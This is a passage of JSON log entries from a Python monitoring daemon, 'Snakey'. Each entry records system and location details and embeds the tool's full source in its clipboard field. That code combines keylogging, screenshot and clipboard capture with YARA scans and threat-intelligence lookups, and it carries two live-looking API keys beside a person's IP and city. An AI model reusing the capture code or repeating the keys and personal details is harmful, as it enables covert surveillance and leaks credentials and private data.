build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4bff72435cd7455a8ddfaa2e3f10163868ccfc2df0f81d04652c523273584350", "screenshot_hash": "9c07e265b9eed4bd81d131b5c6c9837a929345960e451fe79b40b9dccb53bfdd", "_raw_log_hash": "dc4ba4e92c3ca471531a5e7557916fe3c51bf0fddc21b9e7f6c51945585d7da6"}
{"timestamp": "2025-06-20T23:21:46.200335+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post # Keep requests here\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Ensure requests is imported early\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # Your VirusTotal API Key\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\" # Your AbuseIPDB API Key\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n\r\n# --- MODIFICATION START ---\r\n# Define the essential directories to scan for malware.\r\n# These are common locations where malware often resides or drops files.\r\n# Avoid scanning entire system drives (like C:/Windows, C:/Program Files)\r\n# as they contain millions of legitimate files that can trigger generic rules.\r\n\r\n# Get common user-specific paths\r\nuser_home = os.path.expanduser(\"~\")\r\nappdata_local = os.environ.get(\"LOCALAPPDATA\")\r\nappdata_roaming = os.environ.get(\"APPDATA\")\r\ntemp_dir = os.environ.get(\"TEMP\") or os.environ.get(\"TMP\") # Gets the primary temp dir\r\n\r\n# List of essential directories to scan.\r\n# We'll use os.path.normpath to ensure consistent path separators.\r\nyara_scan_dirs = [\r\n    os.path.normpath(os.path.join(user_home, \"Desktop\")),\r\n    os.path.normpath(os.path.join(user_home, \"Downloads\")),\r\n    os.path.normpath(os.path.join(user_home, \"Documents\")),\r\n    os.path.normpath(os.path.join(user_home, \"Pictures\")), # Sometimes malware drops here\r\n]\r\n\r\n# Add AppData and Temp directories if they exist\r\nif appdata_local:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local, \"Temp\"))) # Local AppData Temp\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local))) # General Local AppData\r\nif appdata_roaming:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming))) # General AppData Roaming\r\nif temp_dir:\r\n    yara_scan_dirs.append(os.path.normpath(temp_dir)) # Main system temp dir\r\n\r\n# Add common persistence locations (Windows specific)\r\n# Use os.getenv for environment variables like PROGRAMDATA\r\nprogram_data = os.getenv('PROGRAMDATA') # C:\\ProgramData\r\nif program_data:\r\n    yara_scan_dirs.append(os.path.normpath(program_data))\r\n    # Common Startup folders (malware often uses these for persistence)\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(program_data, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n\r\n# Filter out any non-existent directories from the list to avoid errors\r\nyara_scan_dirs = [d for d in yara_scan_dirs if os.path.isdir(d)]\r\n\r\nprint(f\"[INFO] YARA will scan the following directories: {yara_scan_dirs}\")\r\n# --- MODIFICATION END ---\r\n\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData_Roaming\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"AppData_Local\": os.environ.get(\"LOCALAPPDATA\", \"\"),\r\n        \"Temp\": os.environ.get(\"TEMP\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                # Get the number of files and folders directly inside this directory\r\n                item_count = 0\r\n                for item in os.listdir(path):\r\n                    if os.path.isfile(os.path.join(path, item)) or os.path.isdir(os.path.join(path, item)):\r\n                        item_count += 1\r\n                dir_status[name] = f\"Found ({item_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        if not os.path.exists(yara_rules_path):\r\n            print(f\"[ERROR] YARA rules file not found at: {yara_rules_path}\")\r\n            return findings\r\n\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        print(f\"[INFO] Starting YARA scan of {len(yara_scan_dirs)} essential directories.\")\r\n\r\n        # Define a list of file extensions that YARA can typically scan\r\n        # This includes executables, libraries, script files, and common archive/text formats.\r\n        # Add or remove extensions based on what types of malware you want to detect.\r\n        SCAN_EXTENSIONS = (\r\n            '.exe', '.dll', '.sys', '.ps1', '.vbs', '.js', '.bat', '.cmd', '.scr', '.hta',\r\n            '.jar', '.py', '.pyc', '.bin', '.dat', # Common binary/data files\r\n            '.zip', '.rar', '.7z', '.iso', # Archives (YARA can sometimes scan inside them, or the archive itself)\r\n            '.txt', '.log', '.ini', '.conf', '.json', '.xml', # Text-based config/log files\r\n            # DO NOT include document types like .docx, .pdf, .xlsx, .jpg, .png, .mp3, .mp4\r\n        )\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            if not os.path.isdir(scan_dir):\r\n                print(f\"[WARNING] YARA scan directory '{scan_dir}' does not exist, skipping.\")\r\n                continue\r\n\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n\r\n                    # --- ADD THIS EXTENSION CHECK ---\r\n                    if not file_path.lower().endswith(SCAN_EXTENSIONS):\r\n                        # print(f\"[DEBUG] Skipping non-scanable file type: {file_path}\") # Uncomment for debugging\r\n                        continue\r\n                    # --- END EXTENSION CHECK ---\r\n\r\n                    try:\r\n                        # Add a basic file size check to avoid scanning extremely large files\r\n                        # (e.g., limit to 50MB for most malware samples)\r\n                        if os.path.getsize(file_path) > 50 * 1024 * 1024: # 50 MB\r\n                            # print(f\"[DEBUG] Skipping large file: {file_path}\") # Uncomment for debugging\r\n                            continue\r\n\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except yara.Error as ye:\r\n                        if \"too many matches\" in str(ye).lower():\r\n                            print(f\"[WARNING] YARA: Too many matches for a string in rule(s) for file: {file_path}. Rule(s) might be too broad. Error: {ye}\")\r\n                        else:\r\n                            print(f\"[ERROR] YARA scanning error for {file_path}: {ye}\")\r\n                        continue\r\n                    except Exception as e:\r\n                        # Catch other file-related errors (e.g., permission denied, file in use)\r\n                        print(f\"[WARNING] Could not scan file {file_path} due to OS error: {e}\")\r\n                        continue\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan initialization failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4bff72435cd7455a8ddfaa2e3f10163868ccfc2df0f81d04652c523273584350", "screenshot_hash": "d3343ff59bad27dfd54c40ba4decaa7b4903402a15cbf2d73bab6a26b52d5fa4", "_raw_log_hash": "ae90eb848abf535ae00228c472997a9cdb709d40d128271e724ae1ff6c099abc"}
{"timestamp": "2025-06-20T23:22:01.897708+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post # Keep requests here\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Ensure requests is imported early\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # Your VirusTotal API Key\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\" # Your AbuseIPDB API Key\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n\r\n# --- MODIFICATION START ---\r\n# Define the essential directories to scan for malware.\r\n# These are common locations where malware often resides or drops files.\r\n# Avoid scanning entire system drives (like C:/Windows, C:/Program Files)\r\n# as they contain millions of legitimate files that can trigger generic rules.\r\n\r\n# Get common user-specific paths\r\nuser_home = os.path.expanduser(\"~\")\r\nappdata_local = os.environ.get(\"LOCALAPPDATA\")\r\nappdata_roaming = os.environ.get(\"APPDATA\")\r\ntemp_dir = os.environ.get(\"TEMP\") or os.environ.get(\"TMP\") # Gets the primary temp dir\r\n\r\n# List of essential directories to scan.\r\n# We'll use os.path.normpath to ensure consistent path separators.\r\nyara_scan_dirs = [\r\n    os.path.normpath(os.path.join(user_home, \"Desktop\")),\r\n    os.path.normpath(os.path.join(user_home, \"Downloads\")),\r\n    os.path.normpath(os.path.join(user_home, \"Documents\")),\r\n    os.path.normpath(os.path.join(user_home, \"Pictures\")), # Sometimes malware drops here\r\n]\r\n\r\n# Add AppData and Temp directories if they exist\r\nif appdata_local:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local, \"Temp\"))) # Local AppData Temp\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local))) # General Local AppData\r\nif appdata_roaming:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming))) # General AppData Roaming\r\nif temp_dir:\r\n    yara_scan_dirs.append(os.path.normpath(temp_dir)) # Main system temp dir\r\n\r\n# Add common persistence locations (Windows specific)\r\n# Use os.getenv for environment variables like PROGRAMDATA\r\nprogram_data = os.getenv('PROGRAMDATA') # C:\\ProgramData\r\nif program_data:\r\n    yara_scan_dirs.append(os.path.normpath(program_data))\r\n    # Common Startup folders (malware often uses these for persistence)\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(program_data, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n\r\n# Filter out any non-existent directories from the list to avoid errors\r\nyara_scan_dirs = [d for d in yara_scan_dirs if os.path.isdir(d)]\r\n\r\nprint(f\"[INFO] YARA will scan the following directories: {yara_scan_dirs}\")\r\n# --- MODIFICATION END ---\r\n\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData_Roaming\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"AppData_Local\": os.environ.get(\"LOCALAPPDATA\", \"\"),\r\n        \"Temp\": os.environ.get(\"TEMP\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                # Get the number of files and folders directly inside this directory\r\n                item_count = 0\r\n                for item in os.listdir(path):\r\n                    if os.path.isfile(os.path.join(path, item)) or os.path.isdir(os.path.join(path, item)):\r\n                        item_count += 1\r\n                dir_status[name] = f\"Found ({item_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        if not os.path.exists(yara_rules_path):\r\n            print(f\"[ERROR] YARA rules file not found at: {yara_rules_path}\")\r\n            return findings\r\n\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        print(f\"[INFO] Starting YARA scan of {len(yara_scan_dirs)} essential directories.\")\r\n\r\n        # Define a list of file extensions that YARA can typically scan\r\n        # This includes executables, libraries, script files, and common archive/text formats.\r\n        # Add or remove extensions based on what types of malware you want to detect.\r\n        SCAN_EXTENSIONS = (\r\n            '.exe', '.dll', '.sys', '.ps1', '.vbs', '.js', '.bat', '.cmd', '.scr', '.hta',\r\n            '.jar', '.py', '.pyc', '.bin', '.dat', # Common binary/data files\r\n            '.zip', '.rar', '.7z', '.iso', # Archives (YARA can sometimes scan inside them, or the archive itself)\r\n            '.txt', '.log', '.ini', '.conf', '.json', '.xml', # Text-based config/log files\r\n            # DO NOT include document types like .docx, .pdf, .xlsx, .jpg, .png, .mp3, .mp4\r\n        )\r\n\r\n        for 